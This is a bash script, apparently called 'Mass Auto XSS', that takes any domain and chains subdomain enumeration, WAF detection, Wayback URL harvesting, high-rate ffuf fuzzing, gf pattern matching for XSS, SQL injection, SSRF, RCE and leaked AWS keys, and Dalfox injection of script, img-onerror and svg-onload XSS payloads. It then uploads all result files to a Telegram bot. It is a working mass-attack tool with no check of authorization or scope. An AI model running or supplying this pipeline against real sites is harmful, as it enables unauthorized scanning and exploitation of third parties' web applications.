#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    figlet -w 100 -f small "Mass Auto XSS"
    echo -e "${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Input target function
input_target() {
    clear
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║          Mass Auto XSS Scanner          ${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}\n"
    
    while true; do
        echo -e "${YELLOW}[?] Masukkan domain target ${NC}(contoh: example.com)"
        echo -e "${YELLOW}[?] Ketik 'quit' untuk keluar${NC}"
        echo -ne "\n${GREEN}[+] Target Domain: ${NC}"
        read -r input
        
        # Validasi input
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: Domain tidak boleh kosong!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Keluar dari program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Format domain tidak valid!${NC}"
            sleep 1
            continue
        fi
        
        # Jika validasi berhasil
        echo -e "\n${GREEN}[✓] Domain target valid: $input${NC}"
        echo -e "${BLUE}[*] Memulai pemindaian...${NC}\n"
        sleep 1
        domain="$input"  # Set domain variable
        break
    done
    return 0
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    wafw00f "$domain"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Domain enumeration
enumerate_domain() {
    echo -e "\n${BLUE}[+] Starting Domain Enumeration...${NC}"
    
    # Create directory structure
    mkdir -p "$domain"/{sources,result/{xss,wayback,gf,httpx}}
    
    echo -e "${MAGENTA}[*] Running Subfinder...${NC}"
    subfinder -d "$domain" -o "$domain/sources/subfinder.txt"
    subfinder_count=$(wc -l < "$domain/sources/subfinder.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Subfinder found ${subfinder_count} subdomains${NC}"
    
    echo -e "${MAGENTA}[*] Running Assetfinder...${NC}"
    assetfinder -subs-only "$domain" | tee "$domain/sources/assetfinder.txt"
    assetfinder_count=$(wc -l < "$domain/sources/assetfinder.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Assetfinder found ${assetfinder_count} subdomains${NC}"
    
    echo -e "${MAGENTA}[*] Combining results...${NC}"
    cat "$domain/sources/"*.txt 2>/dev/null | sort -u > "$domain/sources/all.txt"
    total_domains=$(wc -l < "$domain/sources/all.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Total unique subdomains: ${total_domains}${NC}"
    
    echo -e "${GREEN}[✓] Domain enumeration completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# HTTP probe
probe_http() {
    echo -e "\n${BLUE}[+] Probing for live hosts...${NC}"
    cat "$domain/sources/all.txt" | httprobe | tee "$domain/result/httpx/httpx.txt"
    live_hosts=$(wc -l < "$domain/result/httpx/httpx.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found ${live_hosts} live hosts${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    
    cat "$domain/result/httpx/httpx.txt" | waybackurls | anew "$domain/result/wayback/wayback-tmp.txt"
    
    echo -e "${MAGENTA}[*] Filtering relevant URLs...${NC}"
    cat "$domain/result/wayback/wayback-tmp.txt" 2>/dev/null | \
        egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
        sed 's/:80//g;s/:443//g' | sort -u > "$domain/result/wayback/wayback.txt"
    
    rm -f "$domain/result/wayback/wayback-tmp.txt"
    total_urls=$(wc -l < "$domain/result/wayback/wayback.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found ${total_urls} unique URLs${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    cat "$domain/result/wayback/wayback.txt" | \
        ffuf -c -u "FUZZ" -w - -of csv -o "$domain/result/wayback/valid-tmp.txt" -t 100 -rate 1000
    
    cat "$domain/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' >> "$domain/result/wayback/valid.txt"
    rm -f "$domain/result/wayback/valid-tmp.txt"
    
    valid_urls=$(wc -l < "$domain/result/wayback/valid.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found ${valid_urls} valid URLs${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running pattern matching...${NC}"
    
    declare -A patterns=(
        ["xss"]="Cross-Site Scripting"
        ["sqli"]="SQL Injection"
        ["ssrf"]="Server-Side Request Forgery"
        ["redirect"]="Open Redirects"
        ["rce"]="Remote Code Execution"
        ["idor"]="Insecure Direct Object Reference"
        ["lfi"]="Local File Inclusion"
        ["ssti"]="Server-Side Template Injection"
        ["debug_logic"]="Debug Logic"
        ["aws-keys"]="AWS Keys"
        ["php-errors"]="PHP Errors"
    )
    
    total_patterns=${#patterns[@]}
    current=0
    
    for pattern in "${!patterns[@]}"; do
        ((current++))
        echo -e "${MAGENTA}[*] ($current/$total_patterns) Checking for ${patterns[$pattern]}...${NC}"
        gf "$pattern" "$domain/result/wayback/valid.txt" | tee "$domain/result/gf/${pattern}.txt"
        count=$(wc -l < "$domain/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found ${count} potential ${patterns[$pattern]} endpoints${NC}"
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# XSS testing
test_xss() {
    echo -e "\n${BLUE}[+] Testing for XSS vulnerabilities...${NC}"
    
    # Create results directory
    mkdir -p "$domain/result/xss"
    
    echo -e "${MAGENTA}[*] Processing potential XSS endpoints...${NC}"
    cat "$domain/result/gf/xss.txt" 2>/dev/null | \
        grep -E '\bhttps?://[^[:space:]]+[?&][^[:space:]]+=[^[:space:]]+' | \
        sort -u > "$domain/result/xss/potential_xss.txt"
    
    potential_count=$(wc -l < "$domain/result/xss/potential_xss.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found ${potential_count} potential XSS endpoints${NC}"
    
    if [ "$potential_count" -gt 0 ]; then
        echo -e "${MAGENTA}[*] Running Dalfox XSS Scanner...${NC}"
        
        # Run Dalfox with advanced options
        dalfox file "$domain/result/xss/potential_xss.txt" \
            --no-color \
            --format url \
            --skip-bav \
            --skip-mining-all \
            --skip-mining-dict \
            --only-custom-payload \
            --custom-payload "'\\\"><script>alert('XSS')</script>,'\\\"><img src=x onerror=alert('XSS')>,'\\\"><svg onload=alert('XSS')>" \
            --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            --timeout 5 \
            --delay 1 \
            --output "$domain/result/xss/dalfox_results.txt"
        
        # Process Dalfox results and extract confirmed vulnerabilities
        if [ -f "$domain/result/xss/dalfox_results.txt" ]; then
            echo -e "\n${GREEN}[✓] Dalfox scan completed${NC}"
            
            # Extract and format vulnerable URLs
            grep "POC" "$domain/result/xss/dalfox_results.txt" | sort -u > "$domain/result/xss/vulnerable.txt"
            
            vulnerable_count=$(wc -l < "$domain/result/xss/vulnerable.txt" 2>/dev/null || echo "0")
            if [ "$vulnerable_count" -gt 0 ]; then
                echo -e "\n${RED}[!] Found $vulnerable_count confirmed XSS vulnerabilities:${NC}"
                while IFS= read -r vuln; do
                    echo -e "${RED}[+] $vuln${NC}"
                done < "$domain/result/xss/vulnerable.txt"
            fi
        fi
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    echo -e "\n${BLUE}[+] Sending results to Telegram...${NC}"
    
    if [[ -f telegram_token.txt && -f telegram_chat_id.txt ]]; then
        token=$(cat telegram_token.txt)
        chat_id=$(cat telegram_chat_id.txt)
        
        # Send summary message
        message="🔍 XSS scan completed for: $domain
📊 Summary:
• Subdomains found: $(wc -l < "$domain/sources/all.txt" 2>/dev/null || echo "0")
• Live hosts: $(wc -l < "$domain/result/httpx/httpx.txt" 2>/dev/null || echo "0")
• Potential XSS endpoints: $(wc -l < "$domain/result/xss/potential_xss.txt" 2>/dev/null || echo "0")
• Vulnerable endpoints: $(wc -l < "$domain/result/xss/vulnerable.txt" 2>/dev/null || echo "0")
📤 Sending detailed results..."

        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
             -d chat_id="$chat_id" \
             -d text="$message" > /dev/null 2>&1

        # Send files with progress
        total_files=$(find "$domain" -type f | wc -l)
        current=0
        
        find "$domain" -type f | while read -r file; do
            ((current++))
            echo -e "${MAGENTA}[*] Sending file ($current/$total_files): $(basename "$file")${NC}"
            curl -s -F chat_id="$chat_id" \
                 -F document=@"$file" \
                 "https://api.telegram.org/bot$token/sendDocument" > /dev/null 2>&1
        done

        echo -e "${GREEN}[✓] Results sent to Telegram${NC}"
    else
        echo -e "${RED}[!] Telegram credentials not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    check_waf
    enumerate_domain
    probe_http
    collect_wayback
    validate_urls
    run_gf_patterns
    test_xss
    send_to_telegram
    echo -e "\n${GREEN}[✓] Mass XSS scan completed successfully!${NC}\n"
}

# Run the script
main